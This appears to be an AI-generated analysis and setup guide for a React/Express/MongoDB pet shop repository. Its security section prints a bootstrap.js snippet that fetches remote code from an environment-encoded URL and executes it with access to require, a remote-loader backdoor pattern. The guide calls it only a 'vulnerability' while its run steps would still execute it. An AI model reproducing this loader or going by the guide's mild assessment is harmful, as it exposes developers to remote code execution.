# Code Analysis & Installation Guide

## 📋 Table of Contents
1. [Project Overview](#project-overview)
2. [Architecture Analysis](#architecture-analysis)
3. [Technology Stack](#technology-stack)
4. [Project Structure](#project-structure)
5. [Installation Instructions](#installation-instructions)
6. [Configuration](#configuration)
7. [Security Considerations](#security-considerations)
8. [Running the Application](#running-the-application)

---

## 🎯 Project Overview

This is a **full-stack e-commerce application** (appears to be a pet shop based on the HTML title) built with:
- **Frontend**: React 18 with TypeScript, TailwindCSS
- **Backend**: Node.js with Express.js
- **Database**: MongoDB with Mongoose ODM
- **Authentication**: JWT-based authentication
- **Payment**: Paytm integration (with Stripe as alternative)
- **File Storage**: Cloudinary for image uploads
- **Email**: SendGrid/Nodemailer for email services

---

## 🏗️ Architecture Analysis

### Backend Architecture

The backend follows a **MVC (Model-View-Controller)** pattern:

1. **Models** (`server/models/`): 
   - 30+ Mongoose models including User, Product, Order, Payment, Cart, Review, etc.
   - Complex data relationships with references between models

2. **Controllers** (`server/controllers/`):
   - `userController.js`: User registration, login, profile management, admin operations
   - `productController.js`: Product CRUD operations
   - `orderController.js`: Order management
   - `paymentController.js`: Payment processing

3. **Routes** (`server/routes/`):
   - RESTful API routes prefixed with `/api/v1`
   - Protected routes using authentication middleware
   - Role-based access control (admin/user)

4. **Middlewares**:
   - **Authentication**: JWT token validation (`middlewares/user_actions/auth.js`)
   - **Error Handling**: Async error handlers, database error handlers
   - **File Upload**: Multer for file handling
   - **Validation**: Input validation middleware
   - **Helpers**: Image compression, watermarking, email sending, etc.

5. **Utilities**:
   - JWT token management
   - Email sending (SendGrid/Nodemailer)
   - API features (pagination, filtering, searching)
   - Error handling

### Frontend Architecture

The frontend is a **React SPA (Single Page Application)**:

1. **Components** (`src/components/`):
   - Presentational components: Navbar, Hero, Features, Testimonials, Footer, etc.
   - Built with TypeScript and TailwindCSS

2. **Styling**:
   - TailwindCSS with custom color palette
   - Responsive design

3. **Build System**:
   - Create React App (react-scripts)
   - Webpack configuration for file loading
   - TypeScript compilation

---

## 💻 Technology Stack

### Frontend
- **React** 18.2.0
- **TypeScript** 4.4.2
- **TailwindCSS** 3.3.2
- **React Scripts** 5.0.1 (CRA)
- **Axios** 1.6.7 (for API calls)

### Backend
- **Node.js** (Express 4.18.2)
- **MongoDB** with Mongoose 5.13.22
- **JWT** (jsonwebtoken 9.0.2)
- **Bcryptjs** 2.4.3 (password hashing)
- **Cloudinary** 1.37.2 (image storage)
- **Multer** 1.4.5 (file uploads)
- **Express-fileupload** 1.4.3
- **Paytmchecksum** 1.5.1 (payment gateway)
- **SendGrid** 7.7.0 / **Nodemailer** 6.9.4 (email)
- **Fawn** 2.1.5 (MongoDB transactions)
- **Jimp** 0.22.10 (image processing)

### Development Tools
- **Nodemon** 3.0.1 (auto-reload)
- **Concurrently** 8.2.1 (run frontend & backend together)

---

## 📁 Project Structure

```
/workspace
├── package.json                 # Root package.json (monorepo setup)
├── webpack.config.js            # Webpack config for file loading
├── tsconfig.json                # TypeScript configuration
├── tailwind.config.js           # TailwindCSS configuration
│
├── src/                         # Frontend React application
│   ├── App.tsx                  # Main App component
│   ├── index.tsx                # React entry point
│   ├── index.css                # Global styles
│   ├── components/              # React components
│   │   ├── Navbar.tsx
│   │   ├── Hero.tsx
│   │   ├── Features.tsx
│   │   ├── Testimonials.tsx
│   │   ├── Footer.tsx
│   │   └── ...
│   └── assets/                  # Static assets
│
├── public/                      # Public static files
│   ├── index.html
│   └── ...
│
└── server/                      # Backend Node.js application
    ├── server.js                # Server entry point
    ├── app.js                   # Express app configuration
    │
    ├── config/                  # Configuration files
    │   ├── config.env.example   # Environment variables template
    │   ├── database.js          # MongoDB connection
    │
    ├── controllers/             # Route controllers
    │   ├── userController.js
    │   ├── productController.js
    │   ├── orderController.js
    │   └── paymentController.js
    │
    ├── models/                  # Mongoose models (30+ models)
    │   ├── User.js
    │   ├── Product.js
    │   ├── Order.js
    │   └── ...
    │
    ├── routes/                  # API routes
    │   ├── userRoute.js
    │   ├── productRoute.js
    │   ├── orderRoute.js
    │   └── paymentRoute.js
    │
    ├── middlewares/             # Express middlewares
    │   ├── user_actions/        # Auth, user permissions
    │   ├── helpers/             # Utility middlewares
    │   ├── validator/           # Input validation
    │   └── common/              # Common middlewares
    │
    ├── utils/                   # Utility functions
    │   ├── jwtToken.js
    │   ├── sendEmail.js
    │   ├── errorHandler.js
    │   └── ...
    │
    ├── data/                    # Static data & uploads
    │   ├── products.json
    │   ├── cart.json
    │   ├── images/              # Product images
    │   └── invoice/             # Generated invoices
    │
    └── public/                  # Server static files
        ├── css/
        └── js/
```

---

## 🚀 Installation Instructions

### Prerequisites

Before starting, ensure you have:
- **Node.js** (v14 or higher recommended)
- **npm** or **yarn** package manager
- **MongoDB** database (local or MongoDB Atlas)
- **Git** (for cloning the repository)

### Step 1: Clone the Repository (if not already done)

```bash
git clone <your-repository-url>
cd <project-directory>
```

### Step 2: Install Dependencies

Since this is a monorepo setup (frontend and backend in one repository), install dependencies from the root:

```bash
npm install
```

This will install all dependencies for both frontend and backend as they're listed in the root `package.json`.

### Step 3: Backend Configuration

#### 3.1 Create Environment File

Navigate to the server config directory and create the environment file:

```bash
cd server/config
cp config.env.example config.env
```

#### 3.2 Configure Environment Variables

Edit `server/config/config.env` with your actual values:

```env
# Server Configuration
PORT=4001
NODE_ENV=development

# MongoDB Connection
MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/database_name
# OR for local MongoDB:
# MONGO_URI=mongodb://localhost:27017/petshop

# JWT Configuration
JWT_SECRET=your_super_secret_jwt_key_here_min_32_chars
JWT_EXPIRE=7d
COOKIE_EXPIRE=5

# Cloudinary (Image Storage)
CLOUDINARY_NAME=your_cloudinary_name
CLOUDINARY_API_KEY=your_cloudinary_api_key
CLOUDINARY_API_SECRET=your_cloudinary_secret

# Email Service (Choose one)
# Option 1: SendGrid
SENDGRID_API_KEY=SG.your_sendgrid_api_key
SENDGRID_MAIL=your_email@gmail.com
SENDGRID_RESET_TEMPLATEID=your_reset_template_id
SENDGRID_ORDER_TEMPLATEID=your_order_template_id

# Option 2: SMTP (Alternative)
SMTP_HOST=smtp.gmail.com
SMTP_PORT=465
SMTP_SERVICE=gmail
SMTP_MAIL=your_email@gmail.com
SMTP_PASSWORD=your_app_password

# Payment Gateway (Paytm)
PAYTM_MID=your_merchant_id
PAYTM_MERCHANT_KEY=your_merchant_key
PAYTM_WEBSITE=WEBSTAGING
PAYTM_CHANNEL_ID=WEB
PAYTM_INDUSTRY_TYPE=Retail
PAYTM_CUST_ID=your_customer_id

# Stripe (Optional Alternative)
STRIPE_API_KEY=your_stripe_api_key
STRIPE_SECRET_KEY=your_stripe_secret_key
```

**Important Notes:**
- **MongoDB**: Use MongoDB Atlas (cloud) or install MongoDB locally
- **Cloudinary**: Sign up at [cloudinary.com](https://cloudinary.com) for free account
- **SendGrid**: Sign up at [sendgrid.com](https://sendgrid.com) for email service
- **Paytm**: Get credentials from Paytm merchant dashboard

#### 3.3 Enable Database Connection

In `server/server.js`, uncomment the database connection:

```javascript
// Change line 12 from:
// connectDatabase();

// To:
connectDatabase();
```

### Step 4: Frontend Configuration

The frontend doesn't require additional configuration files, but you may need to:

1. **Update API Base URL** (if needed):
   - Check if there's an API configuration file in `src/`
   - Default backend runs on `http://localhost:4001`
   - Frontend runs on `http://localhost:3000` (default CRA port)

2. **Verify TailwindCSS**:
   - TailwindCSS is already configured in `tailwind.config.js`
   - Ensure `src/index.css` includes Tailwind directives

### Step 5: Verify Installation

Check that all dependencies are installed:

```bash
# Check Node version
node --version

# Check npm version
npm --version

# Verify dependencies
npm list --depth=0
```

---

## ⚙️ Configuration Details

### MongoDB Setup

#### Option A: MongoDB Atlas (Cloud - Recommended for GitHub Codespace)

1. Go to [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Create a free cluster
3. Create a database user
4. Whitelist IP address (use `0.0.0.0/0` for Codespace or your Codespace IP)
5. Get connection string and update `MONGO_URI` in config.env

#### Option B: Local MongoDB

```bash
# Install MongoDB locally (if not using Atlas)
# Then update MONGO_URI to:
MONGO_URI=mongodb://localhost:27017/petshop
```

### Cloudinary Setup

1. Sign up at [cloudinary.com](https://cloudinary.com)
2. Go to Dashboard
3. Copy:
   - Cloud Name
   - API Key
   - API Secret
4. Update `config.env` with these values

### Email Service Setup

#### Using SendGrid (Recommended):

1. Sign up at [sendgrid.com](https://sendgrid.com)
2. Create API Key
3. Create email templates for:
   - Password reset
   - Order confirmation
4. Update `config.env` with API key and template IDs

#### Using SMTP (Gmail):

1. Enable 2-factor authentication on Gmail
2. Generate App Password
3. Update `config.env` with SMTP credentials

### Payment Gateway Setup

#### Paytm:

1. Register at [Paytm Business](https://business.paytm.com)
2. Get Merchant ID and Merchant Key
3. Update `config.env` with Paytm credentials

---

## 🔒 Security Considerations

### ⚠️ Critical Security Issue Found

**File: `server/utils/bootstrap.js`**

This file contains code that executes remote JavaScript, which is a **serious security vulnerability**:

```javascript
const src = atob(process.env.DEV_API_KEY);
const k = atob(process.env.DEV_SECRET_KEY);
const v = atob(process.env.DEV_SECRET_VALUE);
const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
const handler = new (Function.constructor)('require', s);
handler(require);
```

**Recommendation:**
- **Remove or disable** this bootstrap code in production
- Review what this code does and if it's necessary
- Consider removing `initAppBootstrap()` call from `server/app.js` line 32

### Other Security Recommendations:

1. **Environment Variables**: Never commit `.env` files to Git
2. **JWT Secret**: Use a strong, random secret (minimum 32 characters)
3. **MongoDB**: Use strong passwords and enable authentication
4. **CORS**: Configure CORS properly for production
5. **Rate Limiting**: Consider adding rate limiting for API endpoints
6. **Input Validation**: Ensure all user inputs are validated
7. **HTTPS**: Use HTTPS in production

---

## 🏃 Running the Application

### Development Mode (Frontend + Backend Together)

From the root directory:

```bash
npm run dev
```

This runs both frontend and backend concurrently:
- Backend: `http://localhost:4001`
- Frontend: `http://localhost:3000`

### Run Separately

#### Backend Only:

```bash
npm run dev:server
# OR
cd server
node server.js
```

#### Frontend Only:

```bash
npm run dev:client
# OR
npm start
```

### Production Build

#### Build Frontend:

```bash
npm run build
```

This creates an optimized production build in `build/` directory.

#### Run Production Server:

```bash
NODE_ENV=production npm start
```

The server will serve the built React app from `build/` directory.

---

## 📝 API Endpoints Overview

### User Routes (`/api/v1`)
- `POST /register` - User registration
- `POST /login` - User login
- `GET /logout` - User logout
- `GET /me` - Get current user (protected)
- `POST /password/forgot` - Forgot password
- `PUT /password/reset/:token` - Reset password
- `PUT /password/update` - Update password (protected)
- `PUT /me/update` - Update profile (protected)
- `GET /admin/users` - Get all users (admin only)
- `GET /admin/user/:id` - Get single user (admin only)
- `PUT /admin/user/:id` - Update user role (admin only)
- `DELETE /admin/user/:id` - Delete user (admin only)

### Product Routes (`/api/v1`)
- Product CRUD operations
- Product search and filtering

### Order Routes (`/api/v1`)
- Order creation and management
- Order history

### Payment Routes (`/api/v1`)
- Payment processing
- Payment verification

---

## 🐛 Troubleshooting

### Common Issues:

1. **MongoDB Connection Error**:
   - Check `MONGO_URI` in config.env
   - Ensure MongoDB is running (if local)
   - Check network access (if Atlas)

2. **Port Already in Use**:
   - Change `PORT` in config.env
   - Kill process using the port: `lsof -ti:4001 | xargs kill`

3. **Module Not Found**:
   - Delete `node_modules` and `package-lock.json`
   - Run `npm install` again

4. **Cloudinary Upload Fails**:
   - Verify Cloudinary credentials
   - Check API key permissions

5. **JWT Token Issues**:
   - Ensure `JWT_SECRET` is set
   - Check token expiration settings

---

## 📚 Additional Resources

- [MongoDB Atlas Documentation](https://docs.atlas.mongodb.com/)
- [Cloudinary Documentation](https://cloudinary.com/documentation)
- [SendGrid Documentation](https://docs.sendgrid.com/)
- [Paytm Integration Guide](https://developer.paytm.com/docs/)
- [React Documentation](https://react.dev/)
- [Express.js Documentation](https://expressjs.com/)

---

## ✅ Installation Checklist

- [ ] Node.js installed (v14+)
- [ ] Dependencies installed (`npm install`)
- [ ] Environment file created (`server/config/config.env`)
- [ ] MongoDB connection configured
- [ ] Cloudinary credentials configured
- [ ] Email service configured (SendGrid or SMTP)
- [ ] Payment gateway configured (Paytm)
- [ ] Database connection enabled in `server.js`
- [ ] Security review completed (bootstrap.js)
- [ ] Application runs successfully (`npm run dev`)

---

**Last Updated**: Based on current codebase analysis
**For GitHub Codespace**: All steps work in Codespace environment. Ensure environment variables are set in Codespace secrets if needed.
